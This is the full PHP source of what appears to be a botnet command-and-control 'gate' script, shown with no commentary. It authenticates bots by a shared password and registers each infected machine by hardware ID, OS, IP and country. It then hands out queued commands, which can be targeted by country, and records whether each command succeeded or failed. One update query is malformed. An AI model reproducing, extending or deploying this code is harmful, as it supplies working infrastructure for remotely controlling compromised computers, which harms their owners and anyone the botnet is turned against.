<?php

$in_gate = true;

include_once('includes/sql.php');
include_once('includes/user.php');
include_once('includes/config.php');
include_once('includes/install.php');

if(!$_GET) die(infoMsg('Missing request parameters.', 'info', true));

if(isset($GLOBALS['bot_pass']) && !empty($GLOBALS['bot_pass']) && 
	isset($_GET['pw']) && $_GET['pw'] == $GLOBALS['bot_pass'])
{
	foreach ($_REQUEST as $key => $value) 
		$_REQUEST[$key] = htmlentities($value);
	
	if (isset($_GET['err']))
	{
		if(isset($_GET['tid']) && isset($_GET['hwid']) && isset($_GET['os']))
		{
			db_query("INSERT INTO `error`(`tid`, `hwid`, `os`, `err`) VALUES(:1, :2, :3, :4)", $_GET['tid'], $_GET['hwid'], $_GET['os'], nl2br(htmlentities($_GET['err'])));
			die('success');
		}
		
		die('fail');
	}
	elseif (isset($_GET['success']))
	{
		if(isset($_GET['hwid']))
		{
			db_query("UPDATE `senttasks` SET `status` = 1 WHERE `tid` = :1 AND `hwid` = :2", $_GET['success'], $_GET['hwid']);
			die('success');
		}

		die('fail');
	}
	elseif (isset($_GET['fail']))
	{
		if(isset($_GET['hwid']))
		{
			db_query("UPDATE `senttasks` SET `status` IS NULL WHERE `tid` = :1 AND `hwid` = :2", $_GET['fail'], $_GET['hwid']);
			die('success');
		}
		
		die('fail');
	}
	else
	{
		if(isset($_GET['hwid']) && isset($_GET['os']))
		{						
			$country = "Unknown";
			$_GET['hwid'] = strtoupper($_GET['hwid']);
			$ip = (isset($_GET['ip']) && !empty($_GET['ip'])) ? $_GET['ip'] : (empty($_SERVER['HTTP_X_FORWARDED_FOR']) ? (empty($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['REMOTE_ADDR'] : $_SERVER['HTTP_CLIENT_IP']) : $_SERVER['HTTP_X_FORWARDED_FOR']);			
			$stmt = db_query("SELECT `country_code`, `country_name` FROM `ip2c` WHERE :1 BETWEEN begin_ip_num AND end_ip_num", ip2long($ip));
			
			if($stmt->rowCount() > 0)
			{
				$row = $stmt->fetch();
				$country = $row['country_name'];
			}
			
			$stmt = db_query("SELECT `id` FROM `bots` WHERE `hwid` = :1", $_GET['hwid']);
			
			if ($stmt->rowCount() > 0) 
				db_query("UPDATE `bots` SET `os` = :2, `ip` = :3, `country` = :4, `date` = CURRENT_TIMESTAMP WHERE `hwid` = :1", $_GET['hwid'], $_GET['os'], $ip, $country);
			else
			{
				if (isset($_GET['uid'])) 
					db_query("INSERT INTO `bots`(`hwid`, `os`, `ip`, `country`, `uid`) VALUES(:1, :2, :3, :4, :5)", $_GET['hwid'], $_GET['os'], $ip, $country, intval($_GET['uid']));
				else
					db_query("INSERT INTO `bots`(`hwid`, `os`, `ip`, `country`) VALUES(:1, :2, :3, :4)", $_GET['hwid'], $_GET['os'], $ip, $country);
			}
			
			foreach (scandir('modules') as $mod)
			{
				if ($mod != '.' && $mod != '..') 
					include_once('modules/'.$mod.'/gate.php');
			}
			
			if (isset($_GET['uid'])) 
				$stmt = db_query("SELECT * FROM `tasks` WHERE `start` <= NOW() AND `stop` > NOW() AND (`count` IS NULL OR `count` > `received`) AND `uid` = :3 AND (`countries` = '' OR `countries` LIKE concat('%', :1, '%')) AND (SELECT COUNT(`id`) FROM `senttasks` WHERE `tid` = `tasks`.`id` AND `hwid` = :2) = 0", $country, $_GET['hwid'], $_GET['uid']);
			else 
				$stmt = db_query("SELECT * FROM `tasks` WHERE `start` <= NOW() AND `stop` > NOW() AND (`count` IS NULL OR `count` > `received`) AND (`countries` = '' OR `countries` LIKE concat('%', :1, '%')) AND (SELECT COUNT(`id`) FROM `senttasks` WHERE `tid` = `tasks`.`id` AND `hwid` = :2) = 0", $country, $_GET['hwid']);
			
			if ($stmt->rowCount() > 0)
			{
				$row = $stmt->fetch();
				
				db_query("UPDATE `tasks` SET `received` = `received` + 1 WHERE `id` = :1", $row['id']);
				db_query("INSERT INTO `senttasks`(`tid`, `hwid`) VALUES(:1, :2)", $row['id'], $_GET['hwid']);
				
				echo $row['id'].'|'.$row['command'];
			}
			
			die('success');
		}
		
		die('fail');
	}
}
?>